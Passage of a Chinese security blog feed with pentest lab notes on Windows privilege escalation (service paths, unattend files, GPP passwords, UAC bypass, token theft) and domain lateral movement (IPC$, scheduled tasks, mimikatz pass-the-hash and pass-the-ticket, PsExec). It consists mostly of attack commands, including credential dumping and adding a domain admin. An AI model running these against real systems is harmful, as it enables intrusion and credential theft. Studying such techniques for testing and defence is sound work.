class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240107161330160.png" alt="image-20240107161330160"><br>接下来检查对目标文件夹的写权限。在这里使用Windows的内置工具icacls，依次检测目录的权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">icacls <span class="hljs-string">&quot;C:\Program Files (x86)\Common Files&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240107161338218.png" alt="image-20240107161338218"><br>要是其中目录后又”Everyone:(OI)(CI)(F)”字样</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">Everyone:用户对这个文件夹有完全控制权限。也就是说，所有用户具有修改这个文件夹的权限。<br>(M):修改<br>(f):修改<br>(CI):从属容器将继续访问控制项<br>(OI):从属文件将继续访问控制项<br>Everyone:(OI)(CI)(F)表示对该文件夹，用户有读写，删除其下文件，删除其子目录的权限<br></code></pre></td></tr></table></figure><p>确认此漏洞后，把要上传的程序重命名并放置在存漏洞且可写的目录下，执行如下命令，尝试重启服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sc stop service_name<br>sc start service_name<br></code></pre></td></tr></table></figure><p>也可以使用msf中的Windows Service Trusted Path Privilege Escalation模块进行渗透测试。该模块将可执行程序放到受影响的文件夹中，然后将受影响的服务重启。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">对trusted_service_path  模块进行参数设置<br></code></pre></td></tr></table></figure><p>命令执行后，会自动反弹shell，但shell会很快中断，这是因为当以进程在windows操作系统中启动后，必须与服务控制管理器进行通信，如果没有通信，服务控制管理器会认为出现了错误，进而终止这个进程。所以在终止载荷进程之前将它迁移到其他进程中（可使用”set AutoRunScript migrate -f”命令自动迁移进程)<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240107161348471.png" alt="image-20240107161348471"></p><ul><li><strong>自动安装配置文件</strong><br>网络管理员在内网中给多态机器配置同一个环境时，通常不会逐台配置，而会使用脚本化批量部署的方式。在这一过程中，会使用安装配置文件。这些配置文件中包含所有的安装配置信息，其中的一些还有可能包含本地管理员账号和密码等信息。这些文件如下：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">C:\sysprep.inf<br>c:\sysprep\sysprep.xml<br>c:\windows\system32\sysprep.inf<br>c:\windows\system32\sysprep\sysprep.xml<br>c:\unattend.xml<br>c:\Windows\Panther\Unattend.xml<br>c:\Windows\Panther\Unattended.xml<br>c:\Windows\Panther\Unattend\Unattended.xml<br>c:\Windows\Panther\Unattend\Unattend.xml<br>c:\windows\system32\sysprep\Unattend.xml<br>c:\windows\system32\sysprep\Panther\Unattend.xml<br></code></pre></td></tr></table></figure><p>可以直接输入如下命令搜索Unattend.xml文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">dir</span> /b /s c:\Unattend.xml<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240107161356728.png" alt="image-20240107161356728"></p><p>msf中也集成了该模块</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">post/windows/gather/enum_unattend<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240107161405788.png" alt="image-20240107161405788"></p><ul><li><strong>计划任务</strong><br>可以使用如下命令查看计算机的计划任务</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">schtasks /query /fo LIST /v<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240107161415095.png" alt="image-20240107161415095"><br>AccessChk用于在Windows中进行一些系统或程序的高级查询，管理和故障排除工资。<br>下载地址：<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/accesschk">https://docs.microsoft.com/zh-cn/sysinternals/downloads/accesschk</a></p><p>执行如下命令，查看指定目录的权限配置情况。如果攻击者对以高权限运行的任务所在的目录具有写权限，就可以使用恶意程序覆盖原来的程序。这样计划任务下次执行时，就会以高权限来运行恶意程序。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">accesschk.exe -dqv <span class="hljs-string">&quot;c:\Microsoft&quot;</span> -accepteula<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240107161424894.png" alt="image-20240107161424894"><br>常用的AccessChk命名<br>第一次运行时会弹出一个许可证协议对话框。这里，可以使用参数 &#x2F;accepteula 自动接受许可证协议</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">accesschk.exe /accepteula<br></code></pre></td></tr></table></figure><p>Accesschk可以自动的检查当我们使用一个特定的用户时，我们是否对Windows的某个服务有写的权限。当我们作为一个低权限用户，我们首先就想要看一下“Authenticated Users”组对这些服务的权限。</p><p>找出某个驱动器下所有权限配置有缺陷的文件夹路径</p><p>accesschk.exe -uwdqs Users c:\<br>accesschk.exe -uwdqs “Authenticated Users” c:\<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240107161433527.png" alt="image-20240107161433527">找出某个驱动器下所有权限配置有缺陷的文件</p><p>accesschk.exe -uwqs Users c:*.*<br>accesschk.exe -uwqs “Authenticated Users” c:*.*</p><h2 id="组策略首选项提权"><a href="#组策略首选项提权" class="headerlink" title="组策略首选项提权"></a>组策略首选项提权</h2><p>参考：<a href="https://www.cnblogs.com/Yang34/p/12492270.html">https://www.cnblogs.com/Yang34/p/12492270.html</a></p><p>文件路径</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">C:\Windows\SYSVOL\domain\Policies\&#123;8C4C36A7-7BA1-4F33-B2F5-9ADD814299F3&#125;\Machine\Preferences\Groups<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240107161442320.png" alt="image-20240107161442320"><br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240107161451440.png" alt="image-20240107161451440">可以看到cpassword使用aes-256算法加密的。可以进行进行解密</p><p>在powersploit中提供了Get-GPPPassword.ps1脚本。将该脚本导入系统，获取组策略中的密码。<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240107161500233.png" alt="image-20240107161500233"><br>msf中也集成了此功能</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">use post/windows/gather/credentials/gpp<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240107161508569.png" alt="image-20240107161508569"><br>Empire查找cpassword，在Empire下执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">usemodule privesc/gpp<br></code></pre></td></tr></table></figure><ul><li><strong>绕UAC提权分析</strong><br>如果计算机的操作系统时windows vista或更高，在权限不够的情况下，访问系统磁盘的根目录，windows目录，Program Files目录，以及读，写系统登录数据库的程序等操作，都需要经过UAC（User Account Control,用户账户控制)的认证才能进行。<br>在msf中运行</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">exploit/windows/local/bypassuac<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240107161518473.png" alt="image-20240107161518473"><br>提权成功</p><ul><li><strong>RunAs模块</strong><br>使用</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">exploit/windows/local/ask<br></code></pre></td></tr></table></figure><p>创建一个可执行文件，目标机器会运行一个发起提权的请求程序，提示用户是否继续运行，如果用户选择继续运行程序，就会返回一个高权限的shell。</p><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240107161526950.png" alt="image-20240107161526950"></p><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240107161533649.png" alt="image-20240107161533649"><br>点击确定后再查看权限就是一个高权限了<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240107161540907.png" alt="image-20240107161540907"><br>要想使用RunAs模块进行提权，当前用户必须在管理员组中或者直到管理员的密码，对UAC的设置则没有要求，在使用RunAs模块时，需要使用EXE::Custom选项创建一个可执行文件（需进行免杀处理)</p><ul><li><strong>Empire 的bypassuac_wscript模块</strong><br>该模块的大致工作原理是，使用c:\windows\wscript.exe执行payload,即可绕过UAC，以管理员权限执行payload.该模块只适用于操作系统为windows7的机器，尚没有对应的补丁，部分杀毒软件会对该模块的运行进行提示。</li></ul><h2 id="令牌窃取"><a href="#令牌窃取" class="headerlink" title="令牌窃取"></a>令牌窃取</h2><p>令牌是指系统中的临时密钥，相当于账户和密码，用于决定是否允许当前请求及判断当前请求是属于哪个用户的，获取令牌，就可以不提供密码或者其他凭据的情况下访问网络和系统资源。这些令牌存在于系统中（除非系统重启）</p><ul><li><strong>令牌窃取</strong><br>如果已经获取了目标机器的meterpreter shell  首先输入”use incognito”<br>然后输入 “list_tokens -u”<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240107161548953.png" alt="image-20240107161548953"><br>这里有两种类型的令牌：一种是Delegation Tokens,也就是授权令牌，它支持交互式登录（例如，可以通过远程桌面登录访问），另一种Impersonation Tokens，也就是模拟令牌，它支持非交互式的会话。令牌数量其实取决于meterperter shell的访问级别。假设已经获得了一个系统管理员的授权令牌，如果攻击者可以伪造这个令牌，便可以拥有它的权限。<br>接下来，在incognito中调用impersonate_token假冒令牌<br>需要注意在输入主机名的时候需要输入两个反斜杠(\)<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240107161556575.png" alt="image-20240107161556575"></li></ul><p>令牌窃取成功</p><ul><li><strong>Rotten Potato本地提权分析</strong><br>如果目标系统中存在有效的令牌，可以通过Rotten Potato程序快速模拟用户令牌来实现权限提升。<br>首先输入”use incognito”命令，然后输入”list_tokens -u”命令，列出可用的令牌。<br>将rottenpotato.exe上传到目标机器中。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">execute -HC -f rottenpotato.exe <br>impersonate_token <span class="hljs-string">&quot;NT AUTHORITY\\SYSTEM&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240107161607032.png" alt="image-20240107161607032"><br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240107161622344.png" alt="image-20240107161622344"></p><ul><li><strong>添加域管理员</strong><br>假设网络中设置了域管理进程。在meterpreter会话框中输入”ps”命令，查看系统进程。找到域管理进程，使用migrate命令迁移到该进程。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">net user sec 123456Bo /ad /domain    <span class="hljs-comment">#添加域用户</span><br>net group <span class="hljs-string">&quot;domain admins&quot;</span> sec /ad /domain    <span class="hljs-comment">#添加到域管理员组</span><br>net group <span class="hljs-string">&quot;domain admins&quot;</span> /domain    <span class="hljs-comment">#查看域管理员组</span><br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240107161635817.png" alt="image-20240107161635817"><br>最开始的权限是不能创建账户的<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240107161649079.png" alt="image-20240107161649079"><br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240107161656572.png" alt="image-20240107161656572"><br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20240107161705030.png" alt="image-20240107161705030"><br>这里没有域管理员进程就随便以一个高权限，思路是一样的。</p><ul><li><strong>无凭证条件下的权限获取分析</strong><br>Responder嗅探<br>参考文章：<a href="https://blog.csdn.net/nzjdsds/article/details/94314995">https://blog.csdn.net/nzjdsds/article/details/94314995</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网安全</tag>
      
      <tag>权限提升</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Bypass waf笔记</title>
    <link href="/2022/06/15/Bypass-waf%E7%AC%94%E8%AE%B0/Bypass-waf%E7%AC%94%E8%AE%B0/"/>
    <url>/2022/06/15/Bypass-waf%E7%AC%94%E8%AE%B0/Bypass-waf%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，您输入的密码错误，请检查后重新输入。" data-whm="抱歉, 当前文章不能被校验, 不过您还是可以看看解密后的内容。">  <script id="hbeData" type="hbeData" data-hmacdigest="1546a9fea1da70ed253cb35f053273d9d79483c4525f732dbeb7c45aaaff6aec"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">当前文章暂不对外可见，请输入密码后查看！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>idea</tag>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>域内横向移动</title>
    <link href="/2022/06/15/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"/>
    <url>/2022/06/15/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/</url>
    
    <content type="html"><![CDATA[<h2 id="常用Windows远程连接和相关命令"><a href="#常用Windows远程连接和相关命令" class="headerlink" title="常用Windows远程连接和相关命令"></a>常用Windows远程连接和相关命令</h2><p>在渗透测试中，拿到目标计算机的用户明文密码或者NTLM Hash后，可以通过PTH(Pass the Hash，凭据传递)的方法，将散列值或明文密码传送到目标机器中进行验证。与目标机器建立连接后，可以使用相关方法在远程Windows操作系统中执行命令。</p><ul><li><strong>IPC</strong><br>  IPC共享“命名管道”的资源，是为实现进程间通信而开放的命令管道。IPC可以通过验证用户名和密码获得相应的权限，通常在远程管理计算机和查看计算机的共享资源时使用。<br>  IPC利用条件<br>  1.一般来讲 ipc$需要139，445端口的支持。<br>  2.管理员开启了默认共享（默认共享是为了方便管理员进行远程管理而默认开启的，包括所有逻辑盘(c$,d$,e$等）<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">net use \\ip\ipc$ <span class="hljs-string">&quot;password&quot;</span> /user:username<br></code></pre></td></tr></table></figure><img src="/2022/06/15/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240107213952669.png" alt="image-20240107213952669"><br><strong>建立连接后使用Windows自带的工具获取远程主机信息</strong><br> 1.DIR命令</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">dir</span> \\DC\c$<br>或<br><span class="hljs-built_in">dir</span> \\ip\c$<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240107214001457.png" alt="image-20240107214001457"><br>2.tasklist</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tasklist /S 10.10.10.11 /U de1ay /P 274355ZWz<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240107214011470.png" alt="image-20240107214011470"><br>3.at 计划任务<br>确认目标系统时间</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">net time \\10.10.10.11<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240107214019260.png" alt="image-20240107214019260"><br>将文件复制到目标系统中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">copy payload.exe \\10.10.10.11\c$<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240107214028393.png" alt="image-20240107214028393"></p><p>使用at创建计划任务（现基本为schtasks命令了)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#在下午1.30运行这个程序</span><br>at  \\10.10.10.11 1.30 PM C:\payload.exe<br><span class="hljs-comment">#清除at记录</span><br>at \\10.10.10.11 7(at的任务<span class="hljs-built_in">id</span>号） /delete<br><span class="hljs-comment">#使用at命令执行命令并将结果写入文件</span><br>at \\10.10.10.11 4.41 PM cmd.exe /c <span class="hljs-string">&quot;ipconfig &gt;c:\1.txt&quot;</span><br></code></pre></td></tr></table></figure><p>使用schtasks命令创建计划任务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#在远程主机中创建名称为”one&quot;的计划任务，该计划任务开机时启动，启动程序为c盘下的s.exe文件,启动权限为system</span><br>schtasks /create /s 10.10.10.11 /tn one /sc onstart /tr c:\s.exe /ru system /f <br><span class="hljs-comment">#执行该计划任务(在建立ipc连接后不需要输入密码，如果没有建立Ipc连接需要输入密码添加  /u:username /p:password</span><br>schtasks /run /s 10.10.10.11 /i /tn <span class="hljs-string">&quot;one&quot;</span><br><span class="hljs-comment">#执行完后删除计划任务</span><br>schtasks /delete /s 10.10.10.11 /tn <span class="hljs-string">&quot;one&quot;</span> /f<br></code></pre></td></tr></table></figure><p>此后还需要删除ipc$</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">net use 名称 /del /y<br></code></pre></td></tr></table></figure><h2 id="哈希传递攻击"><a href="#哈希传递攻击" class="headerlink" title="哈希传递攻击"></a>哈希传递攻击</h2><ul><li><strong>mimikatatz</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./mimikatz.exe <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;sekurlsa::pth /user:de1ay /domain:de1ay.com /ntlm:c271ea43b54feee894fa2d0860e8914f&quot;</span><br></code></pre></td></tr></table></figure><p>输入命令后会弹出一个cmd，此时可以链接目标机了<br><img src="/2022/06/15/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240107214040389.png" alt="image-20240107214040389"></p><ul><li><strong>使用AES-256密码进行哈希传递</strong><br>获取AES-256密码<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mimikatz <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;sekurlsa::ekeys&quot;</span><br></code></pre></td></tr></table></figure><img src="/2022/06/15/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240107214050840.png" alt="image-20240107214050840"></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mimikatz <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;sekurlsa::pth /user:de1ay /domain:de1ay.com /aes256:9c089a15cce776f40c04a817e8df797f6fe941a96f7803e7d00288255a4fe1f9&quot;</span><br></code></pre></td></tr></table></figure><p>使用AES-256目标机上必须装有KB2871997，该补丁禁止本地管理员权限与远程主机进行连接。也就是无法通过本地管理员权限对远程计算机使用PsExec,wmi等。<br>也无法进行常规的哈希传递攻击，但Administrator(SID为500）依然可以。</p><h2 id="票据传递攻击"><a href="#票据传递攻击" class="headerlink" title="票据传递攻击"></a>票据传递攻击</h2><p>要想使用mimikatz的哈希传递功能，必须具有本地管理员权限。mimikatz同样提供了不需要管理员权限进行横向渗透测试的方法。例如票据传递。</p><ul><li><strong>使用Mimikatz进行票据传递</strong><br> 将内存中的票据导出</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mimikatz <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;sekurlsa::tickets /export&quot;</span><br></code></pre></td></tr></table></figure><p>执行命令后会在当前目录多个服务的票据文件。<br>使用mimikatz清除内存中的票据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">kerberos::purge<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240107214059710.png" alt="image-20240107214059710"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">kerberos::ptt <span class="hljs-string">&quot;票据文件路径&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240107214108213.png" alt="image-20240107214108213"></p><ul><li><strong>PsExec的使用</strong><br>先建立ipc连接</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#获取system</span><br>PsExec.exe -accepteula \\10.10.10.11 -s cmd.exe<br><span class="hljs-comment">#获取admin权限</span><br>PsExec.exe -accepteula \\10.10.10.11  cmd.exe<br><span class="hljs-comment">#执行命令</span><br>PsExec.exe \\10.10.10.11 -u de1ay -p 274355ZWz cmd.exe /c <span class="hljs-string">&quot;ipconfig&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240107214117974.png" alt="image-20240107214117974"><br>1.-accepteula:第一次运行运行会弹出确认框，使用该参数就不会弹出确认框了<br>2.-s:以system权限运行远程程序，获取一个system权限交互的shell</p><ul><li><strong>msf中psexec</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">exploit/windows/smb/psexec<br>exploit/windows/smb/psexec_psh(PsExec的powershell版本）<br></code></pre></td></tr></table></figure><h2 id="WMI的使用"><a href="#WMI的使用" class="headerlink" title="WMI的使用"></a>WMI的使用</h2><p>PsExec在内网中被严格监控后，越来越多的反病毒厂商将PsExec加入了黑名单。于是攻击者逐渐开始使用WMI进行横向移动。通过渗透发现，在使用wmiexec进行横向移动时，Windows操作系统默认不会将wmi的操作记录在日志中。</p><ul><li><strong>基本命令</strong></li></ul><figure class="highlight bash"><table><tr><td 